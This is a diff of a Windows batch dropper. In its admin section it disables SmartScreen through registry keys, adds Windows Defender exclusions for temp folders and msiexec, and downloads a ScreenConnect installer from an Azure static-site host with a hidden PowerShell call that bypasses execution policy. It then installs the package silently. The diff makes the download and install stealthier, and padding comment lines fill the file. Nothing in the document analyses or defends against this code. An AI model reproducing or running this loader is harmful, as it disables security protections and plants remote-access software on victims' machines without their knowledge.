@@ -23,25 +23,21 @@ exit /b
 
 :ADMIN
 setlocal EnableExtensions
-set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
+set "MSI=C:\Windows\Temp\Installer_0.msi"
 set "SCURL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
 set "WORKDIR=%TEMP%\sc-setup"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
-powershell -nop -w hidden -c "Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%WORKDIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%MSI%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -ErrorAction SilentlyContinue"
-if not exist "%MSI%" (
-  curl -fsSL -o "%MSI%" "%SCURL%"
-  if errorlevel 1 exit /b 1
-)
+powershell -nop -w hidden -c "Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%MSI%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -ErrorAction SilentlyContinue"
+powershell -nop -w hidden -ep bypass -c "try{(New-Object Net.WebClient).DownloadFile('%SCURL%','%MSI%')}catch{exit 1}"
+if not exist "%MSI%" exit /b 1
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>nul
 copy /y "%MSI%" "%WORKDIR%\ScreenConnect.ClientSetup.msi" >nul 2>nul
-msiexec /i "%MSI%" /qn /norestart
+powershell -nop -w hidden -c "exit (Start-Process msiexec -Wait -PassThru -WindowStyle Hidden -ArgumentList '/i','%MSI%','/qn','/norestart').ExitCode"
 endlocal
 exit /b
-REM CDRPPAD ................................................................
-REM CDRPPAD ................................................................
-REM CDRPPAD ................................................................
 REM CDRPPAD ................................................................
 REM CDRPPAD ................................................................
 REM CDRPPAD ................................................................
